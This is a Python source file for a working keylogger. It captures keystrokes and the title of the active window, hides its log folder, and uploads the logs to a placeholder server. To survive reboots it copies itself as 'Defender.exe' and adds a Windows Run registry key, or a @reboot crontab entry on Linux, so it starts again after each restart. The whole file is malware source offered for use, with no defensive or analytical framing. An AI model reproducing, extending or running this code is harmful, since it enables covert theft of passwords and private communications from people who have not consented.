from pynput import keyboard, mouse  # Import the mouse listener
import os, shutil, subprocess, platform, sys
import time
import requests
import getpass
import atexit
from datetime import datetime
from threading import Thread
import signal
from sys import executable

def setup_persistence():        #This function sets up persistence (runs automatically at startup) of this executable.

    os_type = platform.system()
    if os_type == "Windows":
        location = os.environ['appdata'] + "\\Defender.exe" # Disguise the keylogger as Defender
        if not os.path.exists(location):
            shutil.copyfile(executable, location)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Defender /t REG_SZ /d "{location}" ', shell=True)
    elif os_type == "Linux":
        location = os.path.expanduser('~') + "/.config/KaliStartup"
        if not os.path.exists(location):
            # Create the autostart directory if it doesn't exist
            os.makedirs(location)
            filename = os.path.join(location, "KaliStartup")
            # Copy the keylogger to that new location
            shutil.copyfile(sys.executable, filename)
            # Add the keylogger to startup via crontab
            crontab_line = f"@reboot {filename}"
            os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')

# Run the setup_persistence function
setup_persistence()

# Define the server URL for file uploads
SERVER_URL = 'https://yourserver.com/upload'  # Replace with your server URL

# Define the hidden directory for logs
# Path to the database file
BASE_DIR = os.path.dirname(__file__)
LOG_DIR = os.path.join(BASE_DIR, 'hidden_logs')
UPLOADED_FILES_LOG = os.path.join(LOG_DIR, 'uploaded_files.log')

# Function to get the current PC username
def get_pc_username():
    return getpass.getuser()

# Function to generate a unique log file name with username
def generate_log_file_name():
    username = get_pc_username()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    return f'keylog_{username}_{timestamp}.txt'

# Create the hidden directory if it doesn't exist
def create_hidden_dir():
    system = platform.system()
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        if system == 'Windows':
            import ctypes
            try:
                ctypes.windll.kernel32.SetFileAttributesW(LOG_DIR, 2)  # FILE_ATTRIBUTE_HIDDEN
            except Exception as e:
                print(f"Error hiding directory on Windows: {e}")
        elif system == 'Darwin' or system == 'Linux':
            hidden_dir_path = f".{LOG_DIR}"
            try:
                os.rename(LOG_DIR, hidden_dir_path)
            except Exception as e:
                print(f"Error hiding directory on macOS/Linux: {e}")

create_hidden_dir()

# Define the path to the log file
log_file_path = os.path.join(LOG_DIR, generate_log_file_name())

# Global variables for control
keylogger_thread = None
cleanup_thread_instance = None
mouse_listener_thread = None  # Mouse listener thread
buffer = []  # Buffer to accumulate keystrokes

# Function to upload a file to the server
def upload_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(SERVER_URL, files={'file': file})
            if response.status_code == 200:
                print(f"Successfully uploaded file: {file_path}")
                log_uploaded_file(file_path)  # Log this file as uploaded
                # No deletion here; handled on exit
            else:
                print(f"Failed to upload file: {file_path}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error uploading file {file_path}: {e}")

# Function to log uploaded files
def log_uploaded_file(file_path):
    with open(UPLOADED_FILES_LOG, 'a', encoding='utf-8') as log_file:
        log_file.write(file_path + '\n')

# Function to check if a file has been uploaded
def is_file_uploaded(file_path):
    if not os.path.exists(UPLOADED_FILES_LOG):
        return False
    with open(UPLOADED_FILES_LOG, 'r', encoding='utf-8') as log_file:
        uploaded_files = log_file.read().splitlines()
    return file_path in uploaded_files

# Function to delete uploaded file if it is opened
def delete_uploaded_file_if_opened(file_path):
    if is_file_uploaded(file_path):
        try:
            os.remove(file_path)
            print(f"Uploaded file deleted: {file_path}")
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")

# Function to delete old log files
def delete_old_files(directory='.'):
    now = time.time()
    for filename in os.listdir(directory):
        if filename.startswith('keylog_') and filename.endswith('.txt'):
            file_path = os.path.join(directory, filename)
            file_age = now - os.path.getmtime(file_path)
            if file_age > 24 * 60 * 60:  # 24 hours in seconds
                try:
                    os.remove(file_path)
                    print(f"Deleted old file: {file_path}")
                except Exception as e:
                    print(f"Error deleting file {file_path}: {e}")

# Periodically run the cleanup function
def cleanup_thread():
    while True:
        delete_old_files(LOG_DIR)
        time.sleep(60 * 60)  # Check every hour

# Function to delete all uploaded files when closing
def cleanup_uploaded_files():
    if os.path.exists(UPLOADED_FILES_LOG):
        with open(UPLOADED_FILES_LOG, 'r', encoding='utf-8') as log_file:
            uploaded_files = log_file.read().splitlines()
        for file_path in uploaded_files:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    print(f"Deleted uploaded file: {file_path}")
                except Exception as e:
                    print(f"Error deleting file {file_path}: {e}")

# Register the cleanup function to run on exit
atexit.register(cleanup_uploaded_files)

# Function to log the contents of the buffer (words)
def flush_buffer():
    if buffer:
        word = ''.join(buffer)
        buffer.clear()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        window_title = get_active_window_title()
        log_str = f'{timestamp} - {window_title} - {word}\n'
        with open(log_file_path, 'a', encoding='utf-8') as log_file:
            log_file.write(log_str)

# Basic key logging function
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.space:  # Flush on space
            buffer.append(' ')
            flush_buffer()
        elif key == keyboard.Key.enter:  # Flush on Enter
            flush_buffer()
        elif key in [keyboard.Key.tab, keyboard.Key.backspace]:  # Handle other delimiters
            flush_buffer()
    except Exception as e:
        print(f"Error processing key: {e}")

# Mouse click handler to flush buffer
def on_click(x, y, button, pressed):
    if pressed:
        flush_buffer()

# Function to get the title of the currently active window
def get_active_window_title():
    try:
        import pygetwindow as gw
        return gw.getActiveWindow().title
    except Exception as e:
        return f"Error retrieving window title: {e}"

# Function to upload new files on startup
def upload_new_files():
    log_files = [f for f in os.listdir(LOG_DIR) if f.startswith('keylog_') and f.endswith('.txt')]
    for file in log_files:
        file_path = os.path.join(LOG_DIR, file)
        if not is_file_uploaded(file_path):
            upload_file(file_path)

# Function to handle program termination
def handle_quit_signal(signum, frame):
    global keylogger_thread, cleanup_thread_instance, mouse_listener_thread
    print("Terminating program...")
    flush_buffer()  # Ensure any remaining buffered words are logged
    if keylogger_thread:
        keylogger_thread.join(timeout=1)
    if cleanup_thread_instance:
        cleanup_thread_instance.join(timeout=1)
    if mouse_listener_thread:
        mouse_listener_thread.join(timeout=1)
    sys.exit(0)

# Set up signal handler for graceful exit
signal.signal(signal.SIGINT, handle_quit_signal)
signal.signal(signal.SIGTERM, handle_quit_signal)

# Set up the listener for keyboard events
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Set up the listener for mouse events
def start_mouse_listener():
    with mouse.Listener(on_click=on_click) as mouse_listener:
        mouse_listener.join()

# Upload new log files and start keylogger and mouse listener
upload_new_files()

# Start the keylogger and cleanup threads
keylogger_thread = Thread(target=start_keylogger)
keylogger_thread.start()

cleanup_thread_instance = Thread(target=cleanup_thread, daemon=True)
cleanup_thread_instance.start()

# Start the mouse listener thread
mouse_listener_thread = Thread(target=start_mouse_listener)
mouse_listener_thread.start()
